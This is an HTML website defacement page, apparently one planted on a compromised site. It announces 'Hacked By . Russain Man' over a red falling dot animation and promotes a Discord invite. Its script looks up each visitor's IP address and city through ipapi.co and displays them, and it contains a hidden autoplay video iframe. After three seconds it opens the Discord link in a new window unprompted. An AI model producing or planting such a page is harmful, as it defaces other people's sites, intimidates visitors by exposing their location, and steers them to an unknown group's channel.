<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

</head>
<body>
    <!-- يوتيوب تشغيل تلقائي -->
    <iframe width="0"
            height="0"
            src="https://www.youtube.com/embed/YOUR_VIDEO_ID?autoplay=1"
            frameborder="0"
            allow="autoplay"></iframe>

    <canvas id="myCanvas"></canvas>

    <div class="custom-cursor"></div>

    <h1 class="nmt">https://discord.gg/f4Ux46fUqD</h1>

    <h1 class="name" data-value="Hacked By . Russain Man">Hacked By . Russain Man</h1>

    <div class="image"></div>

    <div id="ip-info" style="color: white; font-size: 1.2rem;"></div>

    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Courier New", Courier, monospace;
        }

        body {
            height: 100vh;
            padding: 20px;
            background-color: black;
            color: white;
            display: flex;
            flex-direction: column;
            gap: 20px;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            overflow: hidden;
        }

        #myCanvas {
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
        }

        .custom-cursor {
            position: absolute;
            width: 64px;
            height: 64px;
            background-color: rgba(255, 255, 0, 0.5);
            border-radius: 50%;
            pointer-events: none;
            transform: translate(-50%, -50%);
        }

        .image {
            height: 450px;
            width: 1000px;
            background: url(https://i.ibb.co/WpcTbH6p/9effdea45c9ab0ae6202098b11fb0acb.jpg);
            border: 2px solid white;
            border-radius: 3px;
            background-repeat: no-repeat;
            background-size: cover;
            background-position: center;
        }

        .name {
            color: white;
            padding: 0rem clamp(1rem, 2vw, 3rem);
            border-radius: clamp(0.4rem, 0.75vw, 1rem);
            z-index: 999;
        }

            .name:hover {
                background-color: white;
                color: black;
            }

        .nmt {
            color: red;
            text-shadow: 0px 0px 10px red;
        }

        @media (max-width: 1100px) {
            .image {
                width: 100%;
            }
        }
    </style>

    <script>
        // مؤشر مخصص
        document.addEventListener("DOMContentLoaded", function () {
            const cursor = document.querySelector(".custom-cursor");
            document.addEventListener("mousemove", function (e) {
                cursor.style.left = e.clientX + "px";
                cursor.style.top = e.clientY + "px";
            });

            document.addEventListener("mouseenter", function () {
                cursor.style.opacity = 1;
            });

            document.addEventListener("mouseleave", function () {
                cursor.style.opacity = 0;
            });
        });

        // نقاط حمرا نازلة من فوق لتحت
        const canvas = document.getElementById("myCanvas");
        const ctx = canvas.getContext("2d");
        const drops = [];

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        function createDrop() {
            return {
                x: Math.random() * canvas.width,
                y: Math.random() * -canvas.height,
                radius: Math.random() * 3 + 2,
                speed: Math.random() * 2 + 1,
            };
        }

        for (let i = 0; i < 100; i++) {
            drops.push(createDrop());
        }

        function drawDrops() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let d of drops) {
                ctx.beginPath();
                ctx.arc(d.x, d.y, d.radius, 0, Math.PI * 2);
                ctx.fillStyle = "red";
                ctx.fill();
                d.y += d.speed;
                if (d.y > canvas.height) {
                    Object.assign(d, createDrop());
                }
            }
            requestAnimationFrame(drawDrops);
        }

        drawDrops();

        window.addEventListener("resize", () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // تأثير الكتابة
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let interval = null;

        document.querySelector(".name").onmouseover = (event) => {
            let iteration = 0;
            clearInterval(interval);
            interval = setInterval(() => {
                event.target.innerText = event.target.innerText
                    .split("")
                    .map((letter, index) => {
                        if (index < iteration) {
                            return event.target.dataset.value[index];
                        }
                        return letters[Math.floor(Math.random() * 26)];
                    })
                    .join("");

                if (iteration >= event.target.dataset.value.length) {
                    clearInterval(interval);
                }

                iteration += 1 / 3;
            }, 30);
        };

        // IP والموقع الجغرافي
        fetch("https://ipapi.co/json/")
            .then((res) => res.json())
            .then((data) => {
                document.getElementById("ip-info").innerHTML = `
                IP: ${data.ip}<br>
                Location: ${data.city}, ${data.country_name}
              `;
            });

        // فتح رابط تلقائي
        setTimeout(() => {
            window.open("https://discord.gg/f4Ux46fUqD", "_blank");
        }, 3000);
    </script>
</body>
</html>
